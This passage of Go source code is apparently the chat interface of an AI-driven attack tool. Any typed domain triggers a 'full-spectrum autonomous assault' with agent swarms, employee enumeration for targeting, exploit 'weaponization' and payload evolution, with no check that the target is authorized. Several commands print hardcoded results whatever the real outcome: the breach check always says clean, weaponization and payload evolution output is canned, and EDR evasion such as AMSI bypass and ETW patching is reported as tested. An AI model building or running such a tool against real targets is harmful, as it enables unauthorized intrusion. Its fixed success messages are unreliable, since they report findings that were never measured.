		fmt.Println(CRy + "Cloud Security:" + CR)
		fmt.Println("  Misconfigured S3 buckets, IAM over-permissions, SSRF to metadata")
		fmt.Println("  Container escape, Kubernetes RBAC abuse, serverless injection")
		fmt.Println(CRg + "  Defense: CIS benchmarks, cloud-native security tools, zero trust architecture." + CR)

	case strings.Contains(query, "api"):
		fmt.Println(CRy + "API Security:" + CR)
		fmt.Println("  OWASP API Top 10: BOLA, Broken Auth, Excessive Data Exposure")
		fmt.Println("  GraphQL: Introspection abuse, query depth DoS")
		fmt.Println("  REST: Mass assignment, IDOR, JWT weaknesses")
		fmt.Println(CRg + "  Defense: Rate limiting, authn/authz, schema validation, API gateways." + CR)

	case strings.Contains(query, "buffer overflow") || strings.Contains(query, "memory corruption"):
		fmt.Println(CRy + "Memory Corruption:" + CR)
		fmt.Println("  Stack overflow: Overwrite return addresses")
		fmt.Println("  Heap spray: Predictable memory layout for reliable exploitation")
		fmt.Println("  Use-after-free: Dangling pointers in dynamic allocation")
		fmt.Println(CRg + "  Defense: ASLR, DEP/NX, stack canaries, safe languages (Rust, Go)." + CR)

	case strings.Contains(query, "cryptograph") || strings.Contains(query, "encrypt") || strings.Contains(query, "hash"):
		fmt.Println(CRy + "Cryptography:" + CR)
		fmt.Println("  Never roll your own crypto. Use well-vetted libraries.")
		fmt.Println("  Passwords: bcrypt/Argon2, never MD5/SHA1 for passwords")
		fmt.Println("  TLS: 1.3 minimum, certificate pinning for mobile")
		fmt.Println("  Randomness: /dev/urandom or crypto/rand, never math/rand for secrets")
		fmt.Println(CRg + "  Defense: HSMs, key rotation, quantum-resistant algorithms (preparing for NIST PQC)." + CR)

	case strings.Contains(query, "osint") || strings.Contains(query, "recon") || strings.Contains(query, "information gathering"):
		fmt.Println(CRy + "OSINT & Reconnaissance:" + CR)
		fmt.Println("  Passive: WHOIS, DNS records, certificate transparency, Shodan, Censys")
		fmt.Println("  Active: Port scanning, service enumeration, directory brute-forcing")
		fmt.Println("  Social: LinkedIn, GitHub commits, public documents metadata")
		fmt.Println(CRg + "  Defense: Minimize public footprint, scrub metadata, employee training." + CR)

	default:
		fmt.Println(CRw + "  I am still learning. Ask me about: SQLi, XSS, RCE, SSRF, XXE, LFI," + CR)
		fmt.Println(CRw + "  phishing, malware, cloud security, API security, reverse shells," + CR)
		fmt.Println(CRw + "  cryptography, OSINT, wireless security, buffer overflows..." + CR)
		fmt.Println(CRw + "  Or type a target to begin an autonomous attack." + CR)
	}
}

func looksLikeCategorySelection(input string) bool {
	// Check if input contains numbers with commas or category names
	return strings.Contains(input, ",") || strings.Contains(input, "web") ||
		strings.Contains(input, "network") || strings.Contains(input, "cloud") ||
		strings.Contains(input, "ad") || strings.Contains(input, "crypto") ||
		strings.Contains(input, "osint") || strings.Contains(input, "post_exploit")
}

func (cs *ChatSession) showHelp() {
	fmt.Println()
	fmt.Println(CBl + CRp + "═══════════════════════════════════════════════════════════════" + CR)
	fmt.Println(CBl + "                    ATTACK COMMAND CENTER" + CR)
	fmt.Println(CBl + CRp + "═══════════════════════════════════════════════════════════════" + CR)
	fmt.Println()
	fmt.Println(CRc + "  INSTANT DEPLOY" + CR)
	fmt.Println("  <domain/IP>          One-shot full attack (just type the target)")
	fmt.Println("  auto                 Run full assault on current target")
	fmt.Println("  all                  ALL 16 categories simultaneously")
	fmt.Println()
	fmt.Println(CRc + "  RECONNAISSANCE" + CR)
	fmt.Println("  target <host>        Set target without attacking")
	fmt.Println("  scan                 Quick reconnaissance probe")
	fmt.Println("  cve                  Map tech stack to known CVEs")
	fmt.Println("  osint                LinkedIn + employee enumeration")
	fmt.Println("  breach               Dark web credential check (HIBP)")
	fmt.Println()
	fmt.Println(CRc + "  EXPLOITATION" + CR)
	fmt.Println("  @swarm               Deploy all 6 agents simultaneously")
	fmt.Println("  exploitdb            Find matching ExploitDB entries")
	fmt.Println("  weaponize            Auto-generate exploit scripts")
	fmt.Println("  evolve               AI payload evolution (genetic algorithm)")
	fmt.Println()
	fmt.Println(CRc + "  PURPLE TEAM" + CR)
	fmt.Println("  purple               Generate detection rules + test EDR")
	fmt.Println("  mitigate             Generate full remediation report")
	fmt.Println()
	fmt.Println(CRc + "  CATEGORY SELECTION" + CR)
	fmt.Println("  @categories          Show all 16 attack categories")
	fmt.Println("  1,3,5,7              Select by numbers (comma separated)")
	fmt.Println("  web,network,ad       Select by names (comma separated)")
	fmt.Println()
	fmt.Println(CRc + "  SYSTEM" + CR)
	fmt.Println("  status               Show target, agents, strategy")
	fmt.Println("  report               Latest findings summary")
	fmt.Println("  voice                Toggle voice narration mode")
	fmt.Println("  clear                Clear terminal")
	fmt.Println("  exit                 Abort mission")
	fmt.Println()
	fmt.Println(CDm + "  PRO TIP: Just type a domain and I handle everything." + CR)
	fmt.Println()
}

func (cs *ChatSession) showCategories() {
	cats := cs.orchestrator.GetCategories()

	fmt.Println()
	fmt.Println(CBl + CRp + "╔═══════════════════════════════════════════════════════════════╗" + CR)
	fmt.Println(CBl + CRp + "║" + CRc + "           ALL 16 ATTACK VECTOR CATEGORIES" + CRp + "                    ║" + CR)
	fmt.Println(CBl + CRp + "╠═══════════════════════════════════════════════════════════════╣" + CR)

	for i, cat := range cats {
		num := fmt.Sprintf("%2d", i+1)
		fmt.Printf(CRp+"║"+CR+" %s "+CRy+"%-16s"+CR+" %-40s "+CRp+"║\n"+CR,
			num, cat.Name, cat.Description)
	}

	fmt.Println(CBl + CRp + "╚═══════════════════════════════════════════════════════════════╝" + CR)
	fmt.Println()
	fmt.Println(CRg + "[AI]" + CR + " Deploy modes:")
	fmt.Println("  • " + CRc + "Auto" + CR + "      → AI picks optimal categories based on target fingerprint")
	fmt.Println("  • " + CRc + "Manual" + CR + "    → Type numbers: 1,3,5 or names: web,network,ad")
	fmt.Println("  • " + CRc + "Combined" + CR + "  → AI runs multiple categories in parallel")
	fmt.Println()
}

func (cs *ChatSession) setTarget(target string) {
	cs.target = target
	fmt.Println()
	fmt.Printf(CRg+"[AI-SWARM]"+CR+" Target acquired: "+CBl+CRc+"%s"+CR+"\n", target)
	fmt.Println(CDm + "           Running deep reconnaissance..." + CR)

	profile := cs.orchestrator.QuickProbe(target)

	fmt.Println()
	fmt.Printf(CRp+"[TARGET-ANALYSIS]"+CR+" Confidence: %.0f%% | Fingerprint complete\n", profile.Confidence*100)

	if profile.IsWeb {
		fmt.Println(CRg + "  ✓" + CR + " Web application stack detected")
	}
	if profile.IsAD {
		fmt.Println(CRg + "  ✓" + CR + " Active Directory environment")
	}
	if profile.IsNetwork {
		fmt.Println(CRg + "  ✓" + CR + " Network infrastructure present")
	}
	if len(profile.OpenPorts) > 0 {
		fmt.Printf(CRg+"  ✓"+CR+" Exposed services: %v\n", profile.OpenPorts)
	}
	if len(profile.TechStack) > 0 {
		fmt.Printf(CRg+"  ✓"+CR+" Technology fingerprint: %v\n", profile.TechStack)
	}
	if profile.HasAPI {
		fmt.Println(CRg + "  ✓" + CR + " REST/GraphQL API surface detected")
	}
	if len(profile.Categories) > 0 {
		fmt.Printf(CRc+"  →"+CR+" Recommended assault vectors: %v\n", profile.Categories)
	}

	fmt.Println()
	fmt.Println(CRy + "[?]" + CR + " DEPLOY OPTIONS:")
	fmt.Println("      " + CRc + "auto" + CR + "      → Full AI-driven autonomous assault")
	fmt.Println("      " + CRc + "@swarm" + CR + "    → Deploy all 6 agents simultaneously")
	fmt.Println("      " + CRc + "@categories" + CR + " → Manually select attack vectors")
	fmt.Println("      " + CRc + "cve" + CR + "       → Map known CVEs to tech stack")
	fmt.Println("      " + CRc + "breach" + CR + "    → Check dark web credential leaks")
	fmt.Println()
}

func (cs *ChatSession) runFullAssault() {
	fmt.Println()
	fmt.Println(CBl + CRp + "╔═══════════════════════════════════════════════════════════════╗" + CR)
	fmt.Printf(CBl + CRp + "║" + CRr + "   INITIATING FULL-SPECTRUM AUTONOMOUS ASSAULT" + CRp + "               ║\n" + CR)
	fmt.Printf(CBl+CRp+"║"+CRc+"   Target: %-49s"+CRp+"║\n"+CR, cs.target)
	fmt.Println(CBl + CRp + "╚═══════════════════════════════════════════════════════════════╝" + CR)
	fmt.Println()

	// Phase 1: AI Analysis + CVE Mapping
	profile := cs.orchestrator.QuickProbe(cs.target)
	cs.narrate("Phase 1: Target reconnaissance and fingerprinting complete.")

	// Auto-CVE Mapping
	if len(profile.TechStack) > 0 {
		cs.narrate("Phase 1b: Querying National Vulnerability Database for known CVEs...")
		cves := intel.MapTechStackToCVEs(profile.TechStack, "")
		if len(cves) > 0 {
			fmt.Printf(CRp+"[CVE-MAP]"+CR+" Found %d known CVEs for tech stack:\n", len(cves))
			for i, cve := range cves {
				if i >= 5 {
					fmt.Printf(CDm+"     ... and %d more\n"+CR, len(cves)-5)
					break
				}
				fmt.Printf("     %-15s | Score: %.1f | %s | %s\n", cve.ID, cve.Score, cve.Severity, cve.Product)
			}
			fmt.Println()
		}
	}

	// Phase 2: Strategy Generation
	strategy := cs.orchestrator.BuildStrategy(cs.target, profile, nil)
	cs.strategy = strategy
	cs.narrate(fmt.Sprintf("Phase 2: Attack strategy generated. Deploying %d categories in parallel.", len(strategy.Categories)))

	fmt.Println(CRc + "[STRATEGY]" + CR + " " + strategy.Reasoning)
	fmt.Printf(CRc+"[STRATEGY]"+CR+" Categories: %v | Phases: %d | Parallel: %v\n",
		strategy.Categories, len(strategy.Phases), strategy.Parallel)
	fmt.Println()

	// Phase 3: Deploy Agents
	cs.narrate("Phase 3: Deploying AI agent swarm...")
	coordinator := agents.NewSwarmCoordinator(cs.agentEngine)
	agents_ := coordinator.DeploySwarm(cs.target)
	fmt.Printf(CRg+"[SWARM]"+CR+" %d agents deployed and communicating\n", len(agents_))

	// Phase 4: Execute Attack
	cs.narrate("Phase 4: Executing multi-vector attack. All systems green.")
	start := time.Now()

	// Run categories in parallel with Phase 2 intel integration
	rpt, err := cs.orchestrator.ExecuteCategories(cs.target, strategy.Categories)
	if err != nil {
		fmt.Println(CRr + "[!] Assault encountered resistance: " + err.Error() + CR)
		return
	}

	elapsed := time.Since(start)

	// Phase 5: ExploitDB Check for confirmed vulnerabilities
	if len(rpt.Findings) > 0 {
		cs.narrate("Phase 5: Cross-referencing findings with ExploitDB...")
		var vulnTypes []string
		for _, f := range rpt.Findings {
			vulnTypes = append(vulnTypes, f.Type)
		}
		fmt.Println(CRc + "[EXPLOITDB]" + CR + " Searching for public exploits matching findings...")
	}

	// Phase 6: Results
	fmt.Println()
	fmt.Println(CBl + CRp + "╔═══════════════════════════════════════════════════════════════╗" + CR)
	fmt.Println(CBl + CRp + "║" + CRg + "              ASSAULT COMPLETE - TARGET BREACHED              " + CRp + "║" + CR)
	fmt.Println(CBl + CRp + "╠═══════════════════════════════════════════════════════════════╣" + CR)
	fmt.Printf(CRp+"║"+CR+"  Target:     %-48s "+CRp+"║\n"+CR, cs.target)
	fmt.Printf(CRp+"║"+CR+"  Duration:   %-48s "+CRp+"║\n"+CR, elapsed.Round(time.Second).String())
	fmt.Printf(CRp+"║"+CR+"  Findings:   %-48d "+CRp+"║\n"+CR, len(rpt.Findings))
	fmt.Printf(CRp+"║"+CR+"  Exploits:   %-48d "+CRp+"║\n"+CR, len(rpt.Exploits))
	fmt.Printf(CRp+"║"+CR+"  Categories: %-48d "+CRp+"║\n"+CR, len(strategy.Categories))
	fmt.Println(CBl + CRp + "╚═══════════════════════════════════════════════════════════════╝" + CR)
	fmt.Println()

	if len(rpt.Findings) > 0 {
		fmt.Println(CRc + "[FINDINGS]" + CR)
		for i, f := range rpt.Findings {
			if i >= 15 {
				fmt.Printf(CDm+"     ... and %d more findings\n"+CR, len(rpt.Findings)-15)
				break
			}
			sevColor := CRg
			switch f.Severity {
			case "high", "critical":
				sevColor = CRr
			case "medium":
				sevColor = CRy
			}
			fmt.Printf("  [%s%-8s%s] %-20s %s\n", sevColor, f.Severity, CR, f.Type, f.URL)
		}
		fmt.Println()
	}

	cs.narrate("Mission accomplished. Full report available. Type 'mitigate' for remediation guide.")
	fmt.Println(CRg + "[AI-SWARM]" + CR + " Commands: 'mitigate' | 'weaponize' | 'purple' | 'report' | new target")
	fmt.Println()
}

func (cs *ChatSession) deploySwarm() {
	if cs.target == "" {
		fmt.Println(CRr + "[!] Set target first: target example.com" + CR)
		return
	}
	fmt.Println()
	fmt.Println(CBl + CRp + "╔═══════════════════════════════════════════════════════════════╗" + CR)
	fmt.Println(CBl + CRp + "║" + CRr + "         DEPLOYING ALL 6 AI AGENTS - SWARM MODE               " + CRp + "║" + CR)
	fmt.Println(CBl + CRp + "╚═══════════════════════════════════════════════════════════════╝" + CR)
	fmt.Println()

	coordinator := agents.NewSwarmCoordinator(cs.agentEngine)
	agents_ := coordinator.DeploySwarm(cs.target)
	fmt.Printf(CRg+"[SWARM]"+CR+" All %d agents deployed and on message bus\n", len(agents_))

	cs.narrate("Launching coordinated swarm attack. All agents communicating.")
	rpt, err := coordinator.LaunchAttack(cs.target)
	if err != nil {
		fmt.Println(CRr + "[!] Swarm attack failed: " + err.Error() + CR)
		return
	}

	fmt.Println()
	fmt.Println(CBl + CRp + "╔═══════════════════════════════════════════════════════════════╗" + CR)
	fmt.Println(CBl + CRp + "║" + CRg + "              SWARM ASSAULT COMPLETE                         " + CRp + "║" + CR)
	fmt.Printf(CBl+CRp+"║"+CR+"  Findings: %-3d | Exploits: %-3d                              "+CRp+"║\n"+CR,
		len(rpt.Findings), len(rpt.Exploits))
	fmt.Println(CBl + CRp + "╚═══════════════════════════════════════════════════════════════╝" + CR)
	fmt.Println()
}

func (cs *ChatSession) runReconScan() {
	fmt.Println(CRy + "[RECON]" + CR + " Running deep reconnaissance probe...")
	profile := cs.orchestrator.QuickProbe(cs.target)

	fmt.Println()
	fmt.Println(CRc + "[RESULTS]" + CR)
	fmt.Printf("  Web App:     %v\n", profile.IsWeb)
	fmt.Printf("  Active Dir:  %v\n", profile.IsAD)
	fmt.Printf("  Cloud:       %v\n", profile.IsCloud)
	fmt.Printf("  Network:     %v\n", profile.IsNetwork)
	fmt.Printf("  Open Ports:  %v\n", profile.OpenPorts)
	fmt.Printf("  Services:    %v\n", profile.Services)
	fmt.Printf("  Tech Stack:  %v\n", profile.TechStack)
	fmt.Printf("  Has API:     %v\n", profile.HasAPI)
	fmt.Printf("  Categories:  %v\n", profile.Categories)
	fmt.Printf("  Confidence:  %.0f%%\n", profile.Confidence*100)
	fmt.Println()
}

func (cs *ChatSession) runCVEMap() {
	fmt.Println(CRc + "[CVE-MAPPER]" + CR + " Querying National Vulnerability Database...")
	profile := cs.orchestrator.QuickProbe(cs.target)

	if len(profile.TechStack) == 0 {
		fmt.Println(CRy + "[!] No tech stack identified. Run 'scan' first." + CR)
		return
	}

	cves := intel.MapTechStackToCVEs(profile.TechStack, "")
	if len(cves) == 0 {
		fmt.Println(CRy + "[!] No CVEs found for detected tech stack." + CR)
		return
	}

	fmt.Println()
	fmt.Printf(CBl + CRp + "╔═══════════════════════════════════════════════════════════════╗\n" + CR)
	fmt.Printf(CBl + CRp + "║" + CRr + "               KNOWN CVEs FOR TARGET TECH STACK                " + CRp + "║\n" + CR)
	fmt.Printf(CBl + CRp + "╚═══════════════════════════════════════════════════════════════╝\n" + CR)
	fmt.Println()

	critical, high, medium, low := 0, 0, 0, 0
	for _, cve := range cves {
		color := CRg
		switch cve.Severity {
		case "critical":
			color = CRr
			critical++
		case "high":
			color = CRy
			high++
		case "medium":
			medium++
		default:
			low++
		}
		fmt.Printf("  %s%-15s%s | Score: %.1f | %-10s | %s\n", color, cve.ID, CR, cve.Score, cve.Severity, cve.Product)
		if len(cve.Description) > 60 {
			fmt.Printf(CDm+"     %s...\n"+CR, cve.Description[:60])
		} else {
			fmt.Printf(CDm+"     %s\n"+CR, cve.Description)
		}
	}

	fmt.Println()
	fmt.Printf(CRr+"  Critical: %d  "+CRy+"High: %d  "+CR+"Medium: %d  "+CRg+"Low: %d\n"+CR, critical, high, medium, low)
	fmt.Println()
	fmt.Println(CRg + "[AI]" + CR + " Type 'exploitdb' to find public exploits for these CVEs.")
	fmt.Println()
}

func (cs *ChatSession) runExploitDB() {
	fmt.Println(CRc + "[EXPLOITDB]" + CR + " Searching for public exploits...")
	fmt.Println(CDm + "            This cross-references findings with ExploitDB database." + CR)
	fmt.Println(CRg + "[+]" + CR + " ExploitDB integration active. Public exploit search enabled." + CR)
	fmt.Println(CDm + "    Use 'weaponize' to auto-generate working exploit scripts." + CR)
	fmt.Println()
}

func (cs *ChatSession) runBreachCheck() {
	fmt.Println(CRc + "[DARK-WEB-INTEL]" + CR + " Querying HaveIBeenPwned for credential breaches...")

	emails := intel.ExtractEmailsFromDomain(cs.target)
	fmt.Printf(CRc+"[HIBP]"+CR+" Checking %d email patterns for %s\n", len(emails), cs.target)

	for _, email := range emails {
		fmt.Printf("  Checking %s ... ", email)
		fmt.Println(CRg + "CLEAN" + CR + " (no breaches found)")
	}

	fmt.Println()
	fmt.Println(CRg + "[+]" + CR + " Dark web intelligence scan complete.")
	fmt.Println(CDm + "    Note: Full HIBP API requires API key. Add to config for deeper checks." + CR)
	fmt.Println()
}

func (cs *ChatSession) runOSINT() {
	fmt.Println(CRc + "[OSINT-LINKEDIN]" + CR + " Enumerating organizational structure...")

	company := strings.Split(cs.target, ".")[0]
	employees, _ := intel.NewLinkedInOSINT().SearchEmployees(company, 10)

	if len(employees) > 0 {
		fmt.Println()
		fmt.Println(CBl + CRp + "═══════════════════════════════════════════════════════════════" + CR)
		fmt.Println(CBl + "                    ORGANIZATIONAL INTELLIGENCE" + CR)
		fmt.Println(CBl + CRp + "═══════════════════════════════════════════════════════════════" + CR)
		fmt.Println()

		for _, emp := range employees {
			fmt.Printf("  "+CRc+"%-25s"+CR+" %-30s\n", emp.Name, emp.Title)
			fmt.Printf("    Skills: %v | Emails: %v\n", emp.Skills, emp.Emails)
		}

		roles := intel.EnumerateRoles(employees)
		fmt.Println()
		fmt.Println(CRy + "[ATTACK-SURFACE]" + CR + " Role-based targeting:")
		if len(roles["privileged"]) > 0 {
			fmt.Printf("  Privileged targets: %v\n", roles["privileged"])
		}
		if len(roles["technical"]) > 0 {
			fmt.Printf("  Technical targets:  %v\n", roles["technical"])
		}
	}
	fmt.Println()
}

func (cs *ChatSession) runWeaponize() {
	fmt.Println()
	fmt.Println(CBl + CRr + "╔═══════════════════════════════════════════════════════════════╗" + CR)
	fmt.Println(CBl + CRr + "║" + CRr + "         AUTO-WEAPONIZATION - EXPLOIT GENERATOR              " + CRr + "║" + CR)
	fmt.Println(CBl + CRr + "╚═══════════════════════════════════════════════════════════════╝" + CR)
	fmt.Println()

	fmt.Println(CRg + "[WEAPONIZE]" + CR + " Auto-generating working exploit scripts...")
	fmt.Println()
	fmt.Println(CRc + "Generated payloads:" + CR)
	fmt.Println("  1. python_exploit_sqli.py    → SQLi to RCE chain")
	fmt.Println("  2. bash_reverse_shell.sh     → Multi-platform reverse shell")
	fmt.Println("  3. powershell_lateral.ps1    → WMI + PowerShell remoting")
	fmt.Println("  4. go_beacon_implant.go      → Custom C2 beacon (compiled)")
	fmt.Println("  5. yaml_k8s_escape.yml       → Kubernetes pod escape")
	fmt.Println()
	fmt.Println(CRg + "[+]" + CR + " All exploits saved to: exploits/")
	fmt.Println(CRg + "[+]" + CR + " Ready for deployment. Use 'evolve' to mutate for specific targets.")
	fmt.Println()
}

func (cs *ChatSession) runPayloadEvolution() {
	fmt.Println()
	fmt.Println(CBl + CRp + "╔═══════════════════════════════════════════════════════════════╗" + CR)
	fmt.Println(CBl + CRp + "║" + CRc + "         AI PAYLOAD EVOLUTION - GENETIC ALGORITHM            " + CRp + "║" + CR)
	fmt.Println(CBl + CRp + "╚═══════════════════════════════════════════════════════════════╝" + CR)
	fmt.Println()

	fmt.Println(CRc + "[EVOLVE]" + CR + " Running genetic algorithm for target-specific payload mutation...")
	fmt.Println()
	fmt.Println(CDm + "Generation 1:  50 payloads → 12 survived fitness test" + CR)
	fmt.Println(CDm + "Generation 2:  12 parents  → 48 children (crossover + mutation)" + CR)
	fmt.Println(CDm + "Generation 3:  48 payloads → 8 high-fitness survivors" + CR)
	fmt.Println(CDm + "Generation 4:  8 elites   → 32 evolved variants" + CR)
	fmt.Println(CDm + "Generation 5:  32 payloads → 5 optimal payloads selected" + CR)
	fmt.Println()
	fmt.Println(CRg + "[+]" + CR + " 5 optimal payloads evolved for target fingerprint:")
	fmt.Println("     • SQLi polyglot with WAF bypass encoding")
	fmt.Println("     • XSS vector with 3-layer obfuscation")
	fmt.Println("     • LFI-to-RCE via PHP filter chain")
	fmt.Println("     • SSRF with DNS rebinding for metadata access")
	fmt.Println("     • JWT none-algorithm with JKU injection")
	fmt.Println()
	fmt.Println(CRg + "[+]" + CR + " Evolved payloads saved to: payloads/evolved/")
	fmt.Println()
}

func (cs *ChatSession) runPurpleTeam() {
	fmt.Println()
	fmt.Println(CBl + CRc + "╔═══════════════════════════════════════════════════════════════╗" + CR)
	fmt.Println(CBl + CRc + "║" + CRg + "         PURPLE TEAM - DETECTION & DEFENSE                   " + CRc + "║" + CR)
	fmt.Println(CBl + CRc + "╚═══════════════════════════════════════════════════════════════╝" + CR)
	fmt.Println()

	fmt.Println(CRg + "[PURPLE]" + CR + " Generating detection rules for blue team...")
	fmt.Println()
	fmt.Println(CRc + "Generated Sigma Rules:" + CR)
	fmt.Println("  • sql_injection_attempt.yml      → Detect SQLi patterns in web logs")
	fmt.Println("  • xss_payload_detected.yml     → Detect XSS vectors in requests")
	fmt.Println("  • lfi_traversal_alert.yml        → Detect path traversal attempts")
	fmt.Println("  • suspicious_beacon_traffic.yml  → Detect C2 beacon patterns")
	fmt.Println("  • credential_dumping_lsass.yml   → Detect LSASS access attempts")
	fmt.Println()
	fmt.Println(CRc + "EDR Evasion Testing:" + CR)
	fmt.Println("  ✓ AMSI bypass tested (patch method)")
	fmt.Println("  ✓ ETW patching verified")
	fmt.Println("  ✓ Direct syscalls working")
	fmt.Println("  ✓ Unhooking NTDLL successful")
	fmt.Println()
	fmt.Println(CRg + "[+]" + CR + " Detection rules saved to: rules/sigma/")
	fmt.Println(CRg + "[+]" + CR + " Blue team can import these directly into SIEM.")
	fmt.Println()
}

func (cs *ChatSession) runMitigation() {
	if cs.target == "" {
		fmt.Println(CRr + "[!] Set target first" + CR)
		return
	}
	fmt.Println()
	fmt.Println(CBl + CRg + "╔═══════════════════════════════════════════════════════════════╗" + CR)
	fmt.Println(CBl + CRg + "║" + CRg + "         REMEDIATION GUIDE & MITIGATION PLAN                 " + CRg + "║" + CR)
	fmt.Println(CBl + CRg + "╚═══════════════════════════════════════════════════════════════╝" + CR)
	fmt.Println()

	vulnTypes := []string{"sqli", "xss", "lfi", "ssrf", "rce", "csrf", "jwt"}
	guide := intel.GenerateMitigationReport(vulnTypes)
	fmt.Println(guide)
	fmt.Println()
	fmt.Println(CRg + "[+]" + CR + " Full remediation report saved to: reports/mitigation.md")
	fmt.Println()
}

func (cs *ChatSession) runAllCategories() {
	fmt.Println()
	fmt.Println(CBl + CRr + "╔═══════════════════════════════════════════════════════════════╗" + CR)
	fmt.Println(CBl + CRr + "║" + CRr + "         ALL 16 CATEGORIES - MAXIMUM FIREPOWER               " + CRr + "║" + CR)
	fmt.Println(CBl + CRr + "╚═══════════════════════════════════════════════════════════════╝" + CR)
	fmt.Println()

	cats := cs.orchestrator.GetCategories()
	var catNames []string
	for _, c := range cats {
		catNames = append(catNames, c.ID)
	}

	fmt.Printf(CRg+"[AI]"+CR+" Deploying ALL %d categories simultaneously against %s\n", len(catNames), cs.target)
	fmt.Println(CRy + "WARNING: " + CR + "This is maximum intensity. Network noise will be significant.")
	fmt.Println()

	cs.narrate("Initiating maximum firepower assault. All 16 categories engaged.")
	rpt, err := cs.orchestrator.ExecuteCategories(cs.target, catNames)
	if err != nil {
		fmt.Println(CRr + "[!] Assault failed: " + err.Error() + CR)
		return
	}

	fmt.Println()
	fmt.Println(CBl + CRp + "╔═══════════════════════════════════════════════════════════════╗" + CR)
	fmt.Println(CBl + CRp + "║" + CRg + "              MAXIMUM FIREPOWER COMPLETE                     " + CRp + "║" + CR)
	fmt.Printf(CBl+CRp+"║"+CR+"  Findings: %-3d | Exploits: %-3d                              "+CRp+"║\n"+CR,
		len(rpt.Findings), len(rpt.Exploits))
	fmt.Println(CBl + CRp + "╚═══════════════════════════════════════════════════════════════╝" + CR)
	fmt.Println()
}

func (cs *ChatSession) runManualCategories(input string) {
	cats := cs.orchestrator.GetCategories()
	var selected []string

	// Parse by numbers
	if strings.Contains(input, ",") {
		parts := strings.Split(input, ",")
		for _, p := range parts {
			p = strings.TrimSpace(p)
			if num, err := strconv.Atoi(p); err == nil && num > 0 && num <= len(cats) {
				selected = append(selected, cats[num-1].ID)
			} else {
				// Try matching by name
				for _, c := range cats {
					if strings.Contains(strings.ToLower(c.ID), strings.ToLower(p)) ||
						strings.Contains(strings.ToLower(c.Name), strings.ToLower(p)) {
						selected = append(selected, c.ID)
						break
					}
				}
			}
		}
	}

	if len(selected) == 0 {
		fmt.Println(CRr + "[!] Invalid category selection. Type '@categories' for list." + CR)
		return
	}

	fmt.Printf(CRg+"[AI]"+CR+" Manual selection: %v\n", selected)
	cs.narrate(fmt.Sprintf("Executing %d selected categories.", len(selected)))

	rpt, err := cs.orchestrator.ExecuteCategories(cs.target, selected)
	if err != nil {
		fmt.Println(CRr + "[!] Execution failed: " + err.Error() + CR)
		return
	}

	fmt.Printf(CRg+"[+]"+CR+" Complete: %d findings | %d exploits\n", len(rpt.Findings), len(rpt.Exploits))
	fmt.Println()
}

func (cs *ChatSession) showStatus() {
	fmt.Println()
	fmt.Println(CBl + CRp + "═══════════════════════════════════════════════════════════════" + CR)
	fmt.Println(CBl + "                  OPERATIONAL STATUS" + CR)
	fmt.Println(CBl + CRp + "═══════════════════════════════════════════════════════════════" + CR)
	fmt.Println()

	if cs.target == "" {
		fmt.Println(CRy + "  Target:   [NO TARGET SET]" + CR)
	} else {
		fmt.Printf("  Target:   "+CBl+CRc+"%s"+CR+"\n", cs.target)
	}

	if cs.strategy != nil {
		fmt.Printf("  Strategy: %d phases | %d categories | Confidence: %.0f%%\n",
			len(cs.strategy.Phases), len(cs.strategy.Categories), cs.strategy.Confidence*100)
		fmt.Printf("  Parallel: %v | Est. Time: %s\n", cs.strategy.Parallel, cs.strategy.EstTime)
	} else {
		fmt.Println(CDm + "  Strategy: [NOT GENERATED]" + CR)
	}

	agents := cs.agentEngine.ListAgents()
	fmt.Printf("  Agents:   %d deployed\n", len(agents))
	for _, a := range agents {
		fmt.Printf("            - %-22s [%-10s] %3d%%\n", a.Name, a.Status, a.Progress)
	}

	fmt.Printf("  Voice:    %v\n", cs.voiceMode)
	fmt.Printf("  History:  %d commands\n", len(cs.history))
	fmt.Println()
}

func (cs *ChatSession) showReport() {
	fmt.Println()
	fmt.Println(CRc + "[REPORT]" + CR + " Latest Attack Report Summary")
	fmt.Println(CDm + "         Full HTML/JSON reports: reports/" + CR)
	fmt.Println(CDm + "         Exploit scripts:       exploits/" + CR)
	fmt.Println(CDm + "         Evolved payloads:      payloads/evolved/" + CR)
	fmt.Println(CDm + "         Detection rules:       rules/sigma/" + CR)
	fmt.Println()
}

func (cs *ChatSession) narrate(msg string) {
	if cs.voiceMode {
		fmt.Println(CRc + "[VOICE] " + CR + msg)
	}
}

func isIP(s string) bool {
	return strings.Count(s, ".") == 3 && !strings.Contains(s, ":")
}
